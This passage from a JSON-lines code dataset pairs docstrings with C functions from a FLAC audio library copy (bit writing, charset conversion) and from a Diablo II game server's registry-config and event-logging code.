(int)cuesheet->tracks[t].num_indices - 1; i >= 0; i--)\n\t\t\t\tif(cuesheet->tracks[t].number < track || (cuesheet->tracks[t].number == track && cuesheet->tracks[t].indices[i].number <= index))\n\t\t\t\t\treturn cuesheet->tracks[t].offset + cuesheet->tracks[t].indices[i].offset;\n\t\treturn 0;\n\t}\n}", "path": "VoiceRecognition\\jni\\flac\\src\\flac\\utils.c", "repo_name": "katchsvartanian/voiceRecognition", "stars": 76, "license": "None", "language": "c", "size": 16730}
{"docstring": "/*\n * Return charset_name from charset_title\n */\n", "func_signal": "gchar *Charset_Get_Name_From_Title (gchar *charset_title)", "code": "{\n\tguint i;\n\n\tif (charset_title)\n\t\tfor (i=0; i<CHARSET_TRANS_ARRAY_LEN; i++)\n\t\t\tif ( strcasecmp(_(charset_title),_(charset_trans_array[i].charset_title)) == 0 )\n\t\t\t\treturn charset_trans_array[i].charset_name;\n\treturn \"\";\n}", "path": "VoiceRecognition\\jni\\flac\\src\\plugin_xmms\\charset.c", "repo_name": "katchsvartanian/voiceRecognition", "stars": 76, "license": "None", "language": "c", "size": 16730}
{"docstring": "/* OPT: an MSVC built-in would be better */\n", "func_signal": "static _inline FLAC__uint32 local_swap32_(FLAC__uint32 x)", "code": "{\n\tx = ((x<<8)&0xFF00FF00) | ((x>>8)&0x00FF00FF);\n\treturn (x>>16) | (x<<16);\n}", "path": "VoiceRecognition\\jni\\flac\\src\\libFLAC\\bitwriter.c", "repo_name": "katchsvartanian/voiceRecognition", "stars": 76, "license": "None", "language": "c", "size": 16730}
{"docstring": "/* UNUSED */\n", "func_signal": "FLAC__bool FLAC__bitwriter_write_golomb_signed(FLAC__BitWriter *bw, int val, unsigned parameter)", "code": "{\n\tunsigned total_bits, msbs, uval;\n\tunsigned k;\n\n\tFLAC__ASSERT(0 != bw);\n\tFLAC__ASSERT(0 != bw->buffer);\n\tFLAC__ASSERT(parameter > 0);\n\n\t/* fold signed to unsigned */\n\tif(val < 0)\n\t\tuval = (unsigned)(((-(++val)) << 1) + 1);\n\telse\n\t\tuval = (unsigned)(val << 1);\n\n\tk = FLAC__bitmath_ilog2(parameter);\n\tif(parameter == 1u<<k) {\n\t\tunsigned pattern;\n\n\t\tFLAC__ASSERT(k <= 30);\n\n\t\tmsbs = uval >> k;\n\t\ttotal_bits = 1 + k + msbs;\n\t\tpattern = 1 << k; /* the unary end bit */\n\t\tpattern |= (uval & ((1u<<k)-1)); /* the binary LSBs */\n\n\t\tif(total_bits <= 32) {\n\t\t\tif(!FLAC__bitwriter_write_raw_uint32(bw, pattern, total_bits))\n\t\t\t\treturn false;\n\t\t}\n\t\telse {\n\t\t\t/* write the unary MSBs */\n\t\t\tif(!FLAC__bitwriter_write_zeroes(bw, msbs))\n\t\t\t\treturn false;\n\t\t\t/* write the unary end bit and binary LSBs */\n\t\t\tif(!FLAC__bitwriter_write_raw_uint32(bw, pattern, k+1))\n\t\t\t\treturn false;\n\t\t}\n\t}\n\telse {\n\t\tunsigned q, r, d;\n\n\t\td = (1 << (k+1)) - parameter;\n\t\tq = uval / parameter;\n\t\tr = uval - (q * parameter);\n\t\t/* write the unary MSBs */\n\t\tif(!FLAC__bitwriter_write_zeroes(bw, q))\n\t\t\treturn false;\n\t\t/* write the unary end bit */\n\t\tif(!FLAC__bitwriter_write_raw_uint32(bw, 1, 1))\n\t\t\treturn false;\n\t\t/* write the binary LSBs */\n\t\tif(r >= d) {\n\t\t\tif(!FLAC__bitwriter_write_raw_uint32(bw, r+d, k+1))\n\t\t\t\treturn false;\n\t\t}\n\t\telse {\n\t\t\tif(!FLAC__bitwriter_write_raw_uint32(bw, r, k))\n\t\t\t\treturn false;\n\t\t}\n\t}\n\treturn true;\n}", "path": "VoiceRecognition\\jni\\flac\\src\\libFLAC\\bitwriter.c", "repo_name": "katchsvartanian/voiceRecognition", "stars": 76, "license": "None", "language": "c", "size": 16730}
{"docstring": "/* * WATCHOUT: The current implementation only grows the buffer. */\n", "func_signal": "static FLAC__bool bitwriter_grow_(FLAC__BitWriter *bw, unsigned bits_to_add)", "code": "{\n\tunsigned new_capacity;\n\tbwword *new_buffer;\n\n\tFLAC__ASSERT(0 != bw);\n\tFLAC__ASSERT(0 != bw->buffer);\n\n\t/* calculate total words needed to store 'bits_to_add' additional bits */\n\tnew_capacity = bw->words + ((bw->bits + bits_to_add + FLAC__BITS_PER_WORD - 1) / FLAC__BITS_PER_WORD);\n\n\t/* it's possible (due to pessimism in the growth estimation that\n\t * leads to this call) that we don't actually need to grow\n\t */\n\tif(bw->capacity >= new_capacity)\n\t\treturn true;\n\n\t/* round up capacity increase to the nearest FLAC__BITWRITER_DEFAULT_INCREMENT */\n\tif((new_capacity - bw->capacity) % FLAC__BITWRITER_DEFAULT_INCREMENT)\n\t\tnew_capacity += FLAC__BITWRITER_DEFAULT_INCREMENT - ((new_capacity - bw->capacity) % FLAC__BITWRITER_DEFAULT_INCREMENT);\n\t/* make sure we got everything right */\n\tFLAC__ASSERT(0 == (new_capacity - bw->capacity) % FLAC__BITWRITER_DEFAULT_INCREMENT);\n\tFLAC__ASSERT(new_capacity > bw->capacity);\n\tFLAC__ASSERT(new_capacity >= bw->words + ((bw->bits + bits_to_add + FLAC__BITS_PER_WORD - 1) / FLAC__BITS_PER_WORD));\n\n\tnew_buffer = (bwword*)safe_realloc_mul_2op_(bw->buffer, sizeof(bwword), /*times*/new_capacity);\n\tif(new_buffer == 0)\n\t\treturn false;\n\tbw->buffer = new_buffer;\n\tbw->capacity = new_capacity;\n\treturn true;\n}", "path": "VoiceRecognition\\jni\\flac\\src\\libFLAC\\bitwriter.c", "repo_name": "katchsvartanian/voiceRecognition", "stars": 76, "license": "None", "language": "c", "size": 16730}
{"docstring": "/***********************************************************************\n *\n * Public class methods\n *\n ***********************************************************************/\n", "func_signal": "FLAC__bool FLAC__bitwriter_init(FLAC__BitWriter *bw)", "code": "{\n\tFLAC__ASSERT(0 != bw);\n\n\tbw->words = bw->bits = 0;\n\tbw->capacity = FLAC__BITWRITER_DEFAULT_CAPACITY;\n\tbw->buffer = (bwword*)malloc(sizeof(bwword) * bw->capacity);\n\tif(bw->buffer == 0)\n\t\treturn false;\n\n\treturn true;\n}", "path": "VoiceRecognition\\jni\\flac\\src\\libFLAC\\bitwriter.c", "repo_name": "katchsvartanian/voiceRecognition", "stars": 76, "license": "None", "language": "c", "size": 16730}
{"docstring": "/* #define HASH(i) 0 */\n/* #define HASH(i) 99 */\n", "func_signal": "static struct inverse_map *make_inverse_map(const unsigned short *from)", "code": "{\n  struct inverse_map *to;\n  char used[256];\n  int i, j, k;\n\n  to = (struct inverse_map *)malloc(sizeof(struct inverse_map));\n  if (!to)\n    return 0;\n  for (i = 0; i < 256; i++)\n    to->first[i] = to->next[i] = used[i] = 0;\n  for (i = 255; i >= 0; i--)\n    if (from[i] != 0xffff) {\n      k = HASH(from[i]);\n      to->next[i] = to->first[k];\n      to->first[k] = i;\n      used[k] = 1;\n    }\n\n  /* Point the empty buckets at an empty list. */\n  for (i = 0; i < 256; i++)\n    if (!to->next[i])\n      break;\n  if (i < 256)\n    for (j = 0; j < 256; j++)\n      if (!used[j])\n\tto->first[j] = i;\n\n  return to;\n}", "path": "VoiceRecognition\\jni\\flac\\src\\share\\utf8\\charset.c", "repo_name": "katchsvartanian/voiceRecognition", "stars": 76, "license": "None", "language": "c", "size": 16730}
{"docstring": "/* TODO: write genres in utf-8 ? */\n", "func_signal": "static __inline int GetGenresFileName(char *buffer, int size)", "code": "{\n\tchar *c;\n\n\tif (!GetModuleFileName(NULL, buffer, size))\n\t\treturn 0;\n\tc = strrchr(buffer, '\\\\');\n\tif (!c) return 0;\n\tstrcpy(c+1, \"genres.txt\");\n\n\treturn 1;\n}", "path": "VoiceRecognition\\jni\\flac\\src\\plugin_winamp2\\infobox.c", "repo_name": "katchsvartanian/voiceRecognition", "stars": 76, "license": "None", "language": "c", "size": 16730}
{"docstring": "/*\n * Function to convert a buffer from one encoding to another.\n * Invalid bytes are replaced by '#', and characters that are\n * not available in the target encoding are replaced by '?'.\n * Each of TO and TOLEN may be zero, if the result is not needed.\n * The output buffer is null-terminated, so it is all right to\n * use charset_convert(fromcode, tocode, s, strlen(s), &t, 0).\n */\n", "func_signal": "int charset_convert(const char *fromcode, const char *tocode,\n\t\t    const char *from, size_t fromlen,\n\t\t    char **to, size_t *tolen)", "code": "{\n  int ret = 0;\n  struct charset *charset1, *charset2;\n  char *tobuf, *p, *newbuf;\n  int i, j, wc;\n\n  charset1 = charset_find(fromcode);\n  charset2 = charset_find(tocode);\n  if (!charset1 || !charset2 )\n    return -1;\n\n  tobuf = (char *)safe_malloc_mul2add_(fromlen, /*times*/charset2->max, /*+*/1);\n  if (!tobuf)\n    return -2;\n\n  for (p = tobuf; fromlen; from += i, fromlen -= i, p += j) {\n    i = charset_mbtowc(charset1, &wc, from, fromlen);\n    if (!i)\n      i = 1;\n    else if (i == -1) {\n      i  = 1;\n      wc = '#';\n      ret = 2;\n    }\n    j = charset_wctomb(charset2, p, wc);\n    if (j == -1) {\n      if (!ret)\n\tret = 1;\n      j = charset_wctomb(charset2, p, '?');\n      if (j == -1)\n\tj = 0;\n    }\n  }\n\n  if (tolen)\n    *tolen = p - tobuf;\n  *p++ = '\\0';\n  if (to) {\n    newbuf = realloc(tobuf, p - tobuf);\n    *to = newbuf ? newbuf : tobuf;\n  }\n  else\n    free(tobuf);\n\n  return ret;\n}", "path": "VoiceRecognition\\jni\\flac\\src\\share\\utf8\\charset.c", "repo_name": "katchsvartanian/voiceRecognition", "stars": 76, "license": "None", "language": "c", "size": 16730}
{"docstring": "/* UNUSED */\n", "func_signal": "unsigned FLAC__bitwriter_golomb_bits_signed(int val, unsigned parameter)", "code": "{\n\tunsigned bits, msbs, uval;\n\tunsigned k;\n\n\tFLAC__ASSERT(parameter > 0);\n\n\t/* fold signed to unsigned */\n\tif(val < 0)\n\t\tuval = (unsigned)(((-(++val)) << 1) + 1);\n\telse\n\t\tuval = (unsigned)(val << 1);\n\n\tk = FLAC__bitmath_ilog2(parameter);\n\tif(parameter == 1u<<k) {\n\t\tFLAC__ASSERT(k <= 30);\n\n\t\tmsbs = uval >> k;\n\t\tbits = 1 + k + msbs;\n\t}\n\telse {\n\t\tunsigned q, r, d;\n\n\t\td = (1 << (k+1)) - parameter;\n\t\tq = uval / parameter;\n\t\tr = uval - (q * parameter);\n\n\t\tbits = 1 + q + k;\n\t\tif(r >= d)\n\t\t\tbits++;\n\t}\n\treturn bits;\n}", "path": "VoiceRecognition\\jni\\flac\\src\\libFLAC\\bitwriter.c", "repo_name": "katchsvartanian/voiceRecognition", "stars": 76, "license": "None", "language": "c", "size": 16730}
{"docstring": "/* UNUSED */\n", "func_signal": "FLAC__bool FLAC__bitwriter_write_rice_signed(FLAC__BitWriter *bw, FLAC__int32 val, unsigned parameter)", "code": "{\n\tunsigned total_bits, interesting_bits, msbs;\n\tFLAC__uint32 uval, pattern;\n\n\tFLAC__ASSERT(0 != bw);\n\tFLAC__ASSERT(0 != bw->buffer);\n\tFLAC__ASSERT(parameter < 8*sizeof(uval));\n\n\t/* fold signed to unsigned; actual formula is: negative(v)? -2v-1 : 2v */\n\tuval = (val<<1) ^ (val>>31);\n\n\tmsbs = uval >> parameter;\n\tinteresting_bits = 1 + parameter;\n\ttotal_bits = interesting_bits + msbs;\n\tpattern = 1 << parameter; /* the unary end bit */\n\tpattern |= (uval & ((1<<parameter)-1)); /* the binary LSBs */\n\n\tif(total_bits <= 32)\n\t\treturn FLAC__bitwriter_write_raw_uint32(bw, pattern, total_bits);\n\telse\n\t\treturn\n\t\t\tFLAC__bitwriter_write_zeroes(bw, msbs) && /* write the unary MSBs */\n\t\t\tFLAC__bitwriter_write_raw_uint32(bw, pattern, interesting_bits); /* write the unary end bit and binary LSBs */\n}", "path": "VoiceRecognition\\jni\\flac\\src\\libFLAC\\bitwriter.c", "repo_name": "katchsvartanian/voiceRecognition", "stars": 76, "license": "None", "language": "c", "size": 16730}
{"docstring": "/* Make sure the environment variable bash 2.0 puts in the environment\n   is valid for the getopt call we must make sure that the ARGV passed\n   to getopt is that one passed to the process.  */\n", "func_signal": "static void\n__attribute__ ((unused))\nstore_args_and_env (int argc, char *const *argv)", "code": "{\n  /* XXX This is no good solution.  We should rather copy the args so\n     that we can compare them later.  But we must not use malloc(3).  */\n  original_argc = argc;\n  original_argv = argv;\n}", "path": "VoiceRecognition\\jni\\flac\\src\\share\\getopt\\getopt.c", "repo_name": "katchsvartanian/voiceRecognition", "stars": 76, "license": "None", "language": "c", "size": 16730}
{"docstring": "/*\n * Implementation of ISO-8859-1.\n * Probably on most architectures this compiles to less than 256 bytes\n * of code, so we can save space by not having a table for this one.\n */\n", "func_signal": "static int mbtowc_iso1(void *map, int *pwc, const char *s, size_t n)", "code": "{\n  int wc;\n\n  (void)map;\n  if (!n || !s)\n    return 0;\n  wc = (unsigned char)*s;\n  if (wc & ~0xff)\n    return -1;\n  if (pwc)\n    *pwc = wc;\n  return wc ? 1 : 0;\n}", "path": "VoiceRecognition\\jni\\flac\\src\\share\\utf8\\charset.c", "repo_name": "katchsvartanian/voiceRecognition", "stars": 76, "license": "None", "language": "c", "size": 16730}
{"docstring": "/*\n * This is like the standard strcasecmp, but it does not depend\n * on the locale. Locale-dependent functions can be dangerous:\n * we once had a bug involving strcasecmp(\"iso\", \"ISO\") in a\n * Turkish locale!\n *\n * (I'm not really sure what the official standard says\n * about the sign of strcasecmp(\"Z\", \"[\"), but usually\n * we're only interested in whether it's zero.)\n */\n", "func_signal": "static int ascii_strcasecmp(const char *s1, const char *s2)", "code": "{\n  char c1, c2;\n\n  for (;; s1++, s2++) {\n    if (!*s1 || !*s1)\n      break;\n    if (*s1 == *s2)\n      continue;\n    c1 = *s1;\n    if ('a' <= c1 && c1 <= 'z')\n      c1 += 'A' - 'a';\n    c2 = *s2;\n    if ('a' <= c2 && c2 <= 'z')\n      c2 += 'A' - 'a';\n    if (c1 != c2)\n      break;\n  }\n  return (unsigned char)*s1 - (unsigned char)*s2;\n}", "path": "VoiceRecognition\\jni\\flac\\src\\share\\utf8\\charset.c", "repo_name": "katchsvartanian/voiceRecognition", "stars": 76, "license": "None", "language": "c", "size": 16730}
{"docstring": "/*\n * Implementation of US-ASCII.\n * Probably on most architectures this compiles to less than 256 bytes\n * of code, so we can save space by not having a table for this one.\n */\n", "func_signal": "static int mbtowc_ascii(void *map, int *pwc, const char *s, size_t n)", "code": "{\n  int wc;\n\n  (void)map;\n  if (!n || !s)\n    return 0;\n  wc = (unsigned char)*s;\n  if (wc & ~0x7f)\n    return -1;\n  if (pwc)\n    *pwc = wc;\n  return wc ? 1 : 0;\n}", "path": "VoiceRecognition\\jni\\flac\\src\\share\\utf8\\charset.c", "repo_name": "katchsvartanian/voiceRecognition", "stars": 76, "license": "None", "language": "c", "size": 16730}
{"docstring": "/*\n * Return charset_title from charset_name\n */\n", "func_signal": "gchar *Charset_Get_Title_From_Name (gchar *charset_name)", "code": "{\n\tguint i;\n\n\tif (charset_name)\n\t\tfor (i=0; i<CHARSET_TRANS_ARRAY_LEN; i++)\n\t\t\tif ( strcasecmp(charset_name,charset_trans_array[i].charset_name) == 0 )\n\t\t\t\treturn _(charset_trans_array[i].charset_title);\n\treturn \"\";\n}", "path": "VoiceRecognition\\jni\\flac\\src\\plugin_xmms\\charset.c", "repo_name": "katchsvartanian/voiceRecognition", "stars": 76, "license": "None", "language": "c", "size": 16730}
{"docstring": "/* UNUSED */\n", "func_signal": "FLAC__bool FLAC__bitwriter_write_utf8_uint32(FLAC__BitWriter *bw, FLAC__uint32 val)", "code": "{\n\tFLAC__bool ok = 1;\n\n\tFLAC__ASSERT(0 != bw);\n\tFLAC__ASSERT(0 != bw->buffer);\n\n\tFLAC__ASSERT(!(val & 0x80000000)); /* this version only handles 31 bits */\n\n\tif(val < 0x80) {\n\t\treturn FLAC__bitwriter_write_raw_uint32(bw, val, 8);\n\t}\n\telse if(val < 0x800) {\n\t\tok &= FLAC__bitwriter_write_raw_uint32(bw, 0xC0 | (val>>6), 8);\n\t\tok &= FLAC__bitwriter_write_raw_uint32(bw, 0x80 | (val&0x3F), 8);\n\t}\n\telse if(val < 0x10000) {\n\t\tok &= FLAC__bitwriter_write_raw_uint32(bw, 0xE0 | (val>>12), 8);\n\t\tok &= FLAC__bitwriter_write_raw_uint32(bw, 0x80 | ((val>>6)&0x3F), 8);\n\t\tok &= FLAC__bitwriter_write_raw_uint32(bw, 0x80 | (val&0x3F), 8);\n\t}\n\telse if(val < 0x200000) {\n\t\tok &= FLAC__bitwriter_write_raw_uint32(bw, 0xF0 | (val>>18), 8);\n\t\tok &= FLAC__bitwriter_write_raw_uint32(bw, 0x80 | ((val>>12)&0x3F), 8);\n\t\tok &= FLAC__bitwriter_write_raw_uint32(bw, 0x80 | ((val>>6)&0x3F), 8);\n\t\tok &= FLAC__bitwriter_write_raw_uint32(bw, 0x80 | (val&0x3F), 8);\n\t}\n\telse if(val < 0x4000000) {\n\t\tok &= FLAC__bitwriter_write_raw_uint32(bw, 0xF8 | (val>>24), 8);\n\t\tok &= FLAC__bitwriter_write_raw_uint32(bw, 0x80 | ((val>>18)&0x3F), 8);\n\t\tok &= FLAC__bitwriter_write_raw_uint32(bw, 0x80 | ((val>>12)&0x3F), 8);\n\t\tok &= FLAC__bitwriter_write_raw_uint32(bw, 0x80 | ((val>>6)&0x3F), 8);\n\t\tok &= FLAC__bitwriter_write_raw_uint32(bw, 0x80 | (val&0x3F), 8);\n\t}\n\telse {\n\t\tok &= FLAC__bitwriter_write_raw_uint32(bw, 0xFC | (val>>30), 8);\n\t\tok &= FLAC__bitwriter_write_raw_uint32(bw, 0x80 | ((val>>24)&0x3F), 8);\n\t\tok &= FLAC__bitwriter_write_raw_uint32(bw, 0x80 | ((val>>18)&0x3F), 8);\n\t\tok &= FLAC__bitwriter_write_raw_uint32(bw, 0x80 | ((val>>12)&0x3F), 8);\n\t\tok &= FLAC__bitwriter_write_raw_uint32(bw, 0x80 | ((val>>6)&0x3F), 8);\n\t\tok &= FLAC__bitwriter_write_raw_uint32(bw, 0x80 | (val&0x3F), 8);\n\t}\n\n\treturn ok;\n}", "path": "VoiceRecognition\\jni\\flac\\src\\libFLAC\\bitwriter.c", "repo_name": "katchsvartanian/voiceRecognition", "stars": 76, "license": "None", "language": "c", "size": 16730}
{"docstring": "/*\n *  Helpers\n */\n", "func_signal": "ULONGLONG FileSize(const char *fileName)", "code": "{\n\tLARGE_INTEGER res;\n\tHANDLE hFile = CreateFile(fileName, 0, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);\n\n\tif (hFile == INVALID_HANDLE_VALUE) return 0;\n\tres.LowPart = GetFileSize(hFile, &res.HighPart);\n\tCloseHandle(hFile);\n\treturn res.QuadPart;\n}", "path": "VoiceRecognition\\jni\\flac\\src\\plugin_winamp2\\infobox.c", "repo_name": "katchsvartanian/voiceRecognition", "stars": 76, "license": "None", "language": "c", "size": 16730}
{"docstring": "/*\n * UTF-8 equivalents of the C library's wctomb() and mbtowc().\n */\n", "func_signal": "int utf8_mbtowc(int *pwc, const char *s, size_t n)", "code": "{\n  unsigned char c;\n  int wc, i, k;\n\n  if (!n || !s)\n    return 0;\n\n  c = *s;\n  if (c < 0x80) {\n    if (pwc)\n      *pwc = c;\n    return c ? 1 : 0;\n  }\n  else if (c < 0xc2)\n    return -1;\n  else if (c < 0xe0) {\n    if (n >= 2 && (s[1] & 0xc0) == 0x80) {\n      if (pwc)\n\t*pwc = ((c & 0x1f) << 6) | (s[1] & 0x3f);\n      return 2;\n    }\n    else\n      return -1;\n  }\n  else if (c < 0xf0)\n    k = 3;\n  else if (c < 0xf8)\n    k = 4;\n  else if (c < 0xfc)\n    k = 5;\n  else if (c < 0xfe)\n    k = 6;\n  else\n    return -1;\n\n  if (n < (size_t)k)\n    return -1;\n  wc = *s++ & ((1 << (7 - k)) - 1);\n  for (i = 1; i < k; i++) {\n    if ((*s & 0xc0) != 0x80)\n      return -1;\n    wc = (wc << 6) | (*s++ & 0x3f);\n  }\n  if (wc < (1 << (5 * k - 4)))\n    return -1;\n  if (pwc)\n    *pwc = wc;\n  return k;\n}", "path": "VoiceRecognition\\jni\\flac\\src\\share\\utf8\\charset.c", "repo_name": "katchsvartanian/voiceRecognition", "stars": 76, "license": "None", "language": "c", "size": 16730}
{"docstring": "/*********************************************************************\n * Purpose: to log the argument\n * Return: none\n *********************************************************************/\n", "func_signal": "void LogAP(LPCSTR lpModule, LPCSTR lpFormat, va_list ap)", "code": "{\n\tSYSTEMTIME\tst;\n\tDWORD\t\tlen;\n\tchar\t\tmsg[MAX_LINE_LEN];\n\tchar\t\ttmp[MAX_LINE_LEN];\n\n\tif (!d2gsconf.enablegemsg) return;\n\tif (!lpModule || !lpFormat)  return;\n\tGetLocalTime(&st);\n\tlen = wsprintf(msg, \"%02d/%02d %02d:%02d:%02d.%03d\", st.wMonth, st.wDay,\n\t\tst.wHour, st.wMinute, st.wSecond, st.wMilliseconds);\n\tlen += vsprintf(tmp, lpFormat, ap);\n\tstrcat(msg, tmp);\n\tstrcat(msg, \"\\n\");\n\tlen += strlen(\"\\n\");\n\tfprintf(gestrm, \"%s\", msg);\n\tfflush(gestrm);\n#ifdef DEBUG_ON_CONSOLE\n\tfprintf(stdout, \"%s\", msg);\n#endif\n\treturn;\n\n}", "path": "D2GS\\eventlog.c", "repo_name": "tesseract2048/d2gs", "stars": 78, "license": "None", "language": "c", "size": 730}
{"docstring": "/*********************************************************************\n * Purpose: to set the string value to the registry\n * Return: TRUE(success) or FALSE(failed)\n *********************************************************************/\n", "func_signal": "int D2GSSetConfigString(LPCSTR keyname, LPCSTR str)", "code": "{\n\tHKEY\t\thKey;\n\n\tif (!RegkeyOpen(HKEY_LOCAL_MACHINE, REGKEY_ROOT, &hKey, KEY_SET_VALUE))\n\t\treturn FALSE;\n\tif (!RegkeyWriteString(hKey, keyname, str)) {\n\t\tRegkeyClose(hKey);\n\t\treturn FALSE;\n\t} else {\n\t\tRegkeyClose(hKey);\n\t\treturn TRUE;\n\t}\n\n}", "path": "D2GS\\config.c", "repo_name": "tesseract2048/d2gs", "stars": 78, "license": "None", "language": "c", "size": 730}
{"docstring": "/*********************************************************************\n * Purpose: to initialize the envet log system\n * Return: TRUE(success) or FALSE(failed)\n *********************************************************************/\n", "func_signal": "int D2GSEventLogInitialize(void)", "code": "{\n\teventstrm = fopen(\"d2gs.log\", \"a\");\n\n\t/* for debug, used by hexdump.c */\n\thexstrm = fopen(\"debug.log\", \"a\");\n\tif (!hexstrm) return FALSE;\n\n\tif (eventstrm) return TRUE;\n\telse return FALSE;\n\n}", "path": "D2GS\\eventlog.c", "repo_name": "tesseract2048/d2gs", "stars": 78, "license": "None", "language": "c", "size": 730}
{"docstring": "/*********************************************************************\n * Purpose: to write a dword key from the variable\n * Return: TRUE(success) or FALSE(failed)\n *********************************************************************/\n", "func_signal": "int RegkeyWriteDWORD(HKEY hKey, LPCTSTR name, DWORD val)", "code": "{\n\tDWORD\tdwVal, dwLen;\n\tLONG\tlReturn;\n\n\tif ((!hKey) || (!name))\treturn FALSE;\n\tdwVal = val;\n\tdwLen = sizeof(dwVal);\n\tlReturn = RegSetValueEx(hKey, name, 0L, REG_DWORD, (const BYTE*)&dwVal, dwLen);\n\tif (lReturn==ERROR_SUCCESS)\n\t\treturn TRUE;\n\telse\n\t\treturn FALSE;\n\n}", "path": "D2GS\\config.c", "repo_name": "tesseract2048/d2gs", "stars": 78, "license": "None", "language": "c", "size": 730}
{"docstring": "/*********************************************************************\n * Purpose: to set the string value to the registry\n * Return: TRUE(success) or FALSE(failed)\n *********************************************************************/\n", "func_signal": "int D2GSSetConfigDWORD(LPCSTR keyname, DWORD dwVal)", "code": "{\n\tHKEY\t\thKey;\n\n\tif (!RegkeyOpen(HKEY_LOCAL_MACHINE, REGKEY_ROOT, &hKey, KEY_SET_VALUE))\n\t\treturn FALSE;\n\tif (!RegkeyWriteDWORD(hKey, keyname, dwVal)) {\n\t\tRegkeyClose(hKey);\n\t\treturn FALSE;\n\t} else {\n\t\tRegkeyClose(hKey);\n\t\treturn TRUE;\n\t}\n\n}", "path": "D2GS\\config.c", "repo_name": "tesseract2048/d2gs", "stars": 78, "license": "None", "language": "c", "size": 730}
{"docstring": "/*********************************************************************\n * Purpose: to cleanup the envet log system\n * Return: none\n *********************************************************************/\n", "func_signal": "void D2GEEventLogCleanup(void)", "code": "{\n\tif (gestrm) fclose(gestrm);\n\n\tgestrm = NULL;\n\n\treturn;\n\n}", "path": "D2GE\\eventlog.c", "repo_name": "tesseract2048/d2gs", "stars": 78, "license": "None", "language": "c", "size": 730}
{"docstring": "/*********************************************************************\n * Purpose: to cleanup the envet log system\n * Return: none\n *********************************************************************/\n", "func_signal": "void D2GSEventLogCleanup(void)", "code": "{\n\tif (eventstrm) fclose(eventstrm);\n\n#ifdef DEBUG\n\tif (hexstrm) fclose(hexstrm);\n#endif\n\n\teventstrm = NULL;\n\n\treturn;\n\n}", "path": "D2GS\\eventlog.c", "repo_name": "tesseract2048/d2gs", "stars": 78, "license": "None", "language": "c", "size": 730}
{"docstring": "/*********************************************************************\n * Purpose: to write a string key from the buffer\n * Return: TRUE(success) or FALSE(failed)\n *********************************************************************/\n", "func_signal": "int RegkeyWriteString(HKEY hKey, LPCTSTR name, LPCSTR buf)", "code": "{\n\tDWORD\tdwLen;\n\tLONG\tlReturn;\n\n\tif ((!hKey) || (!name))\treturn FALSE;\n\tdwLen = strlen(buf)+1;\n\tlReturn = RegSetValueEx(hKey, name, 0L, REG_SZ, (const BYTE*)buf, dwLen);\n\tif (lReturn==ERROR_SUCCESS)\n\t\treturn TRUE;\n\telse\n\t\treturn FALSE;\n\n}", "path": "D2GS\\config.c", "repo_name": "tesseract2048/d2gs", "stars": 78, "license": "None", "language": "c", "size": 730}
{"docstring": "/*********************************************************************\n * Purpose: to open an existing registry key\n * Return: TRUE(success) or FALSE(failed)\n *********************************************************************/\n", "func_signal": "int RegkeyOpen(HKEY hKeyRoot, LPCTSTR lpSubKey, PHKEY hKey, REGSAM sam)", "code": "{\n\tint error = RegOpenKeyEx(hKeyRoot, lpSubKey, 0, sam, hKey);\n\tif (error==ERROR_SUCCESS)\n\t\treturn TRUE;\n\telse\n\t\treturn FALSE;\n\n}", "path": "D2GS\\config.c", "repo_name": "tesseract2048/d2gs", "stars": 78, "license": "None", "language": "c", "size": 730}
{"docstring": "/*********************************************************************\n * Purpose: to log the argument\n * Return: none\n *********************************************************************/\n", "func_signal": "void LogAP(LPCSTR lpModule, LPCSTR lpFormat, va_list ap)", "code": "{\n\tSYSTEMTIME\tst;\n\tDWORD\t\tlen;\n\tchar\t\tmsg[MAX_LINE_LEN];\n\tchar\t\ttmp[MAX_LINE_LEN];\n\n\tif (!d2gsconf.enablegemsg) return;\n\tif (!lpModule || !lpFormat)  return;\n\tGetLocalTime(&st);\n\tlen = wsprintf(msg, \"%02d/%02d %02d:%02d:%02d.%03d\", st.wMonth, st.wDay,\n\t\tst.wHour, st.wMinute, st.wSecond, st.wMilliseconds);\n\tlen += vsprintf(tmp, lpFormat, ap);\n\tstrcat(msg, tmp);\n\tstrcat(msg, \"\\n\");\n\tlen += strlen(\"\\n\");\n\tfprintf(gestrm, \"%s\", msg);\n\tfflush(gestrm);\n#ifdef DEBUG_ON_CONSOLE\n\tfprintf(stdout, \"%s\", msg);\n#endif\n\treturn;\n\n}", "path": "D2GE\\eventlog.c", "repo_name": "tesseract2048/d2gs", "stars": 78, "license": "None", "language": "c", "size": 730}
{"docstring": "/*********************************************************************\n * Purpose: to close an opened registry key\n * Return: none\n *********************************************************************/\n", "func_signal": "void RegkeyClose(HKEY hKey)", "code": "{\n\tif (hKey)\n\t\tRegCloseKey(hKey);\n\treturn;\n\n}", "path": "D2GS\\config.c", "repo_name": "tesseract2048/d2gs", "stars": 78, "license": "None", "language": "c", "size": 730}
{"docstring": "/*********************************************************************\n * Purpose: to log the event to the file or the standard output\n * Return: none\n *********************************************************************/\n", "func_signal": "void D2GSEventLog(char const * module, char const * fmt, ...)", "code": "{\n\tva_list\t\targs;\n\tchar\t\ttime_string[EVENT_TIME_MAXLEN];\n\tSYSTEMTIME\tst;\n    \n    if (!d2gsconf.enablegslog) return;\n\tif (!eventstrm) return;\n\n\tGetLocalTime(&st);\n\tsprintf(time_string, \"%02d/%02d %02d:%02d:%02d.%03d\", st.wMonth, st.wDay,\n\t\tst.wHour, st.wMinute, st.wSecond, st.wMilliseconds);\n    \n\tif (!module) {\n\t\tfprintf(eventstrm, \"%s eventlog: got NULL module\\n\", time_string);\n\t\tfflush(eventstrm);\n#ifdef DEBUG_ON_CONSOLE\n\t\tfprintf(stdout, \"%s eventlog: got NULL module\\n\", time_string);\n#endif\n\t\treturn;\n\t}\n\tif (!fmt) {\n\t\tfprintf(eventstrm, \"%s eventlog: got NULL fmt\\n\",time_string);\n\t\tfflush(eventstrm);\n#ifdef DEBUG_ON_CONSOLE\n\t\tfprintf(stdout, \"%s eventlog: got NULL fmt\\n\",time_string);\n#endif\n\t\treturn;\n\t}\n    \n\tfprintf(eventstrm,\"%s %s: \", time_string, module);\n#ifdef DEBUG_ON_CONSOLE\n\tfprintf(stdout,\"%s %s: \", time_string, module);\n#endif\n\tva_start(args, fmt);\n\tvfprintf(eventstrm, fmt, args);\n#ifdef DEBUG_ON_CONSOLE\n\tvfprintf(stdout, fmt, args);\n#endif\n\tva_end(args);\n\tfprintf(eventstrm, \"\\n\");\n\tfflush(eventstrm);\n#ifdef 